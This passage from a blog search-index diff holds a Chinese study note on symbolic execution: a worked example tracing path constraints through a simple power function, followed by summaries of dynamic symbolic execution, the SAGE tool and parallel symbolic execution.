+    2 &amp; a1 &amp; ? &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
+    3 &amp; a1 &amp; a2 &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
+    4 &amp; a1 &amp; a2 &amp; a3 &amp; a1 &amp; a2 &amp; true \cr \hline
+\end{array}
+\]</span></p>
+<blockquote>
+<p>Line 5是return (a1+a2)</p>
+</blockquote>
+<p>既然符号执行与具体值执行最大的区别是if条件语句，那么我们写一个带有if语句的程序来看一下
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 1: POWER: PROCEDURE(X, Y);</span><br><span class="line"> 2:     Z = 1;</span><br><span class="line"> 3:     J = 1;</span><br><span class="line"> 4:</span><br><span class="line"> 5: LAB: IF Y &gt;= J THEN</span><br><span class="line"> 6:         DO;</span><br><span class="line"> 7:             Z = Z * X;</span><br><span class="line"> 8:             J = J + 1;</span><br><span class="line"> 9:             GO TO LAB;</span><br><span class="line">10:         END;</span><br><span class="line">11:</span><br><span class="line">12:     RETURN(Z);</span><br><span class="line">13: END POWER;</span><br></pre></td></tr></table></figure></p>
+<p>这个函数转化为C++就是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int power(int X, int Y) &#123;</span><br><span class="line">    int Z = 1;</span><br><span class="line">    int J = 1;</span><br><span class="line">    while (Y &gt;= J) &#123;</span><br><span class="line">        Z *= X;</span><br><span class="line">        J++;</span><br><span class="line">    &#125;</span><br><span class="line">    return Z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们继续用表格的格式来看</p>
+<p><span class="math display">\[
+\def\arraystretch{.6}
+   \begin{array}{|c|c|c|c|c|c|}
+   \hline
+        Line &amp; Z &amp; J &amp; X &amp; Y &amp; pc \cr \hline
+        1 &amp; ? &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
+        2 &amp; 1 &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
+        3 &amp; 1 &amp; 1 &amp; a1 &amp; a2 &amp; true \cr \hline
+\end{array}
+\]</span></p>
+<p>前三行都很正常，直到第五行进行判断<br />
+1. 处理判断语句 <code>Y&gt;=J</code> 得到约束条件 <code>a2&gt;=1</code>
+2. 生成两个分支的路径约束条件：<br />
+- (a2&gt;=1) <span class="math inline">\(\subset\)</span> true -
+~(a2&gt;=1) <span class="math inline">\(\subset\)</span> true 3.
+两个路径约束都可满足，分别对两个路径进行探索</p>
+<p>对于分支: ~(a2&gt;=1) <span class="math inline">\(\subset\)</span>
+true</p>
+<p><span class="math display">\[
+\def\arraystretch{.6}
+   \begin{array}{|c|c|c|c|c|c|}
+   \hline
+        Line &amp; Z &amp; J &amp; X &amp; Y &amp; pc \cr \hline
+        5 &amp; 1 &amp; 1 &amp; a1 &amp; a2 &amp; ~(a2&gt;=1) \cr \hline
+\end{array}
+\]</span></p>
+<p>然后马上在Line 12处得到(return 1 when a2&lt;1)，探索完成</p>
+<p>对于分支: (a2&gt;=1) <span class="math inline">\(\subset\)</span>
+true</p>
+<p><span class="math display">\[
+\def\arraystretch{.6}
+   \begin{array}{|c|c|c|c|c|c|}
+   \hline
+        Line &amp; Z &amp; J &amp; X &amp; Y &amp; pc \cr \hline
+        5 &amp; 1 &amp; 1 &amp; a1 &amp; a2 &amp; (a2&gt;=1) \cr \hline
+        7 &amp; a1 &amp; 1 &amp; a1 &amp; a2 &amp; (a2&gt;=1) \cr \hline
+        8 &amp; a1 &amp; 2 &amp; a1 &amp; a2 &amp; (a2&gt;=1) \cr \hline
+\end{array}
+\]</span></p>
+<p>然后因为Line
+9，程序会跳回第四行继续判断语句，会产生两个新的分支，就陷入了无限循环，这不是我们想要的。</p>
+<p>可是循环在一个程序中经常出现，该怎么解决这一问题？我们接着往后看</p>
+<h1 id="x01-动态符号执行技术dse">0x01 动态符号执行技术(DSE)</h1>
+<ul>
+<li><strong>基本思想</strong>
+<ol type="1">
+<li>以具体的数值作为输入，执行程序代码，在程序实际执行路径的基础上：
+<ol type="1">
+<li>用符号执行技术对路径进行分析</li>
+<li>提取路径的约束表达式</li>
+<li>根据路径搜索策略(深度、广度)对约束表达式进行变形</li>
+<li>求解变形后的表达式并生成新的测试用例</li>
+<li>不断迭代上述过程，直到完全遍历程序的所有执行路径</li>
+</ol></li>
+<li>DSE的出现是为了解决静态SE①执行效率低②系统开销大③误报率高的问题</li>
+</ol></li>
+<li><strong>实现细节(以函数为例)</strong>
+<ol type="1">
+<li>场景：<code>void func(int a,int b)</code>,调用<code>func(X,Y)</code></li>
+<li>Step1: 生成一组随机输入，开始"实际执行"</li>
+<li>Step2:
+<strong>同时</strong>符号引擎开始符号执行，按照“实际执行”的“执行路径”上的分支条件语句的“谓词”，搜集所有符号约束条件及其对应真值</li>
+<li>Step3:
+根据收集到的符号约束条件，按照一定路径选择策略，构造出一条新的可行路径约束
+<ul>
+<li>举个例子：深度优先策略</li>
+<li>如果<code>pc = p1 ∩ p2 ∩ p3</code>,
+深度优先就是将最后一个谓词(对不起jo太郎😭离散没学好忘了这个p3叫啥了)取非，变为<code>p1 ∩ p2 ∩ ~p3</code></li>
+</ul></li>
+<li>Step4: 使用约束求解器求解出新约束集合对应的具体输入</li>
+<li>Step5: 重复上述过程，直到遍历全部路径</li>
+</ol></li>
+<li><strong>DSE工具SAGE</strong>
+<ol type="1">
+<li>原理粗略地过了一遍，大段大段的看不懂😭这里就不花时间总结了</li>
+<li>SAGE基于x86的机器码进行符号执行，原因如下：
+<ol type="1">
+<li>屏蔽不同编程语言、编译器及编译平台对分析过程的影响，具有更强的复用性</li>
+<li>忽略编译器"代码优化""代码混淆""基本块转换"等使代码语义发生变化的操作，有利于确定程序实际存在的漏洞</li>
+<li>闭源分析yyds</li>
+</ol></li>
+</ol></li>
+<li><strong>关键问题</strong>
+<ol type="1">
+<li>外部函数调用</li>
+<li>循环问题：路径爆炸</li>
+</ol></li>
+</ul>
+<blockquote>
+<p>这一段也不仔细读了...用到再学</p>
+</blockquote>
+<h1 id="x02-并行符号执行技术pse">0x02
+<strong>并行符号执行技术(PSE)</strong></h1>
+<ul>
+<li><strong>基本思想</strong>
+<ol type="1">
+<li>很多情况下符号执行引擎无法继续运行的原因是内存不足，所以我们希望通过计算集群可无穷扩展的内存空间和CPU来缓解路径爆炸问题</li>
+<li>分布式...这我就先不看了</li>
+</ol></li>
+</ul>
+<h1 id="x03-参考文献">0x03 参考文献</h1>
+<p>1《软件安全分析与应用》</p>
+]]></content>
+      <categories>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>SymbolicExecution</tag>
       </tags>
   </entry>
 </search>
